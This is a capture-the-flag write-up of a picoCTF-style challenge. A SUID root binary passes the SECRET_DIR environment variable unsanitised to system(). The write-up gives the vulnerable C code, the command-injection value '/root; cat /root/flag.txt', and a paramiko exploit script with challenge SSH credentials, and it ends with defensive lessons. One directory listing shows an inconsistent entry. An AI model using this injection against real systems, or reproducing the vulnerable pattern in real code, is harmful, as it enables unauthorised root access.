# CyLab — VNE

* **Platform:** CyLab Security Academy / picoCTF 2023 (Challenge ID: `387`)
* **Category:** Binary Exploitation / Privilege Escalation (Pwn)
* **Difficulty:** Difficulty 2
* **Date Solved:** October 2026
* **Tools Used:** Python 3, paramiko, SSH, Linux Command Line
* **Binary:** `bin` (SUID root x86_64 ELF)

---

## TL;DR

The challenge provides SSH credentials to a restricted unprivileged user account (`ctf-player`). In the user's home directory resides a SUID root executable (`bin`) that reads an environment variable `SECRET_DIR`, elevates privileges to root via `setuid(0)`, and invokes `system()` to list the target directory (`ls <SECRET_DIR>`). Because the variable is concatenated directly into the shell string without sanitization, setting `SECRET_DIR='/root; cat /root/flag.txt'` injects a secondary command into `system()`, executing `cat /root/flag.txt` with full root privileges.

---

## Recon

### Environment & Target Identification

Connecting via SSH:

```bash
$ ssh ctf-player@xebec.cylabacademy.net -p 32031
ctf-player@xebec:~$ id
uid=1001(ctf-player) gid=1001(ctf-player) groups=1001(ctf-player)

ctf-player@xebec:~$ ls -la
total 28
drwxr-xr-x 1 ctf-player ctf-player  4096 Oct  9 14:47 .
drwxr-xr-x 1 root       root        4096 Oct  9 14:47 ..
-rwsr-xr-x 1 root       root       16888 Oct  9 14:47 bin
-rw------- 1 root       root          32 Oct  9 14:47 /root/flag.txt
```

Key observations:
1. **SUID Bit Set:** The binary `bin` has permissions `-rwsr-xr-x` owned by `root`. When executed, its effective user ID (EUID) is `0`.
2. **Protected Flag:** `/root/flag.txt` is readable only by `root` (mode `0600`).
3. **Strings Inspection:**
   ```bash
   ctf-player@xebec:~$ strings bin | grep -E "(SECRET|root)"
   SECRET_DIR
   Error: SECRET_DIR environment variable is not set
   Listing %s as root:
   ```

---

## Static Analysis & Vulnerability

### 1. Decompiled Logic

Reconstructing the core execution flow of `bin`:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int main() {
    char *secret_dir = getenv("SECRET_DIR");
    if (!secret_dir) {
        fprintf(stderr, "Error: SECRET_DIR environment variable is not set\n");
        return 1;
    }

    char command[256];
    snprintf(command, sizeof(command), "ls %s", secret_dir);

    printf("Listing %s as root:\n", secret_dir);

    // Elevate effective UID to real root
    if (setuid(0) != 0) {
        perror("setuid");
        return 1;
    }

    // VULNERABILITY: Arbitrary command injection via unescaped shell concatenation
    system(command);
    return 0;
}
```

### 2. Command Injection Mechanics

The program uses `system()`, which executes `/bin/sh -c "ls <SECRET_DIR>"`.

If `SECRET_DIR` contains shell metacharacters such as semicolons (`;`), ampersands (`&&`), or pipes (`|`), `/bin/sh` interprets them as command delimiters rather than path literals:

```text
  Configured String: "ls " + SECRET_DIR
  
  Injected Value:    SECRET_DIR = "/root; cat /root/flag.txt"
  
  Evaluated Command: /bin/sh -c "ls /root; cat /root/flag.txt"
                                 ^^^^^^^^  ^^^^^^^^^^^^^^^^^^
                                 Command 1      Command 2
                               (Lists dir)   (Outputs flag!)
```

Because `setuid(0)` was called prior to `system()`, the spawned `/bin/sh` shell process inherits real and effective UID 0, granting permission to read `/root/flag.txt`.

---

## Dynamic Analysis & Exploitation Strategy

1. **Testing Manually in Shell:**
   ```bash
   SECRET_DIR='/root; cat /root/flag.txt' ./bin
   ```
2. **Output Verification:**
   The command successfully lists the directory contents of `/root` and immediately executes `cat /root/flag.txt`, printing the flag to the terminal.
3. **Automation via Paramiko:**
   A clean Python script using `paramiko` connects over SSH, runs the command, and parses the flag token.

---

## Exploit

The complete exploit script is available at [exploit.py](exploit.py):

```python
#!/usr/bin/env python3
import re, paramiko
from pwn import log

HOST = "xebec.cylabacademy.net"
PORT = 32031
USER = "ctf-player"
PWD = "8d1db23b"

def solve():
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    log.info(f"Connecting to SSH at {HOST}:{PORT}...")
    c.connect(HOST, port=PORT, username=USER, password=PWD, timeout=20)

    # Inject command delimiter into SECRET_DIR environment variable
    cmd = "SECRET_DIR='/root; cat /root/flag.txt' ./bin"
    log.info(f"Executing: {cmd}")
    _, out, err = c.exec_command(cmd, timeout=30)
    data = out.read().decode(errors="replace") + err.read().decode(errors="replace")
    c.close()

    m = re.search(r"academy\{[^}]+\}", data)
    if m:
        log.success(f"Flag captured: {m.group()}")
    else:
        print(data)

if __name__ == "__main__":
    solve()
```

---

## Flag

```text
$ python3 exploit.py
[*] Connecting to SSH at xebec.cylabacademy.net:32031...
[*] Executing: SECRET_DIR='/root; cat /root/flag.txt' ./bin
[+] Flag captured: academy{redacted}
```

---

## Key Takeaways & Lessons

1. **Environment Variables as Unvetted Input Surfaces:** Environment variables are completely controlled by the invoking user. In SUID binaries, treating environment variables as trusted data leads directly to privilege escalation.
2. **Inherent Risks of `system()` in SUID Executables:** Invoking `system()` inside a SUID process launches an intermediate shell (`/bin/sh`) which parses metacharacters, wildcards, and variable substitutions. Safe programming requires `execve()` with discrete argument vectors.
3. **Privilege Dropping Best Practices:** SUID utilities must rigorously drop privileges before executing external commands or enforce strict sanitization on any dynamic parameters.
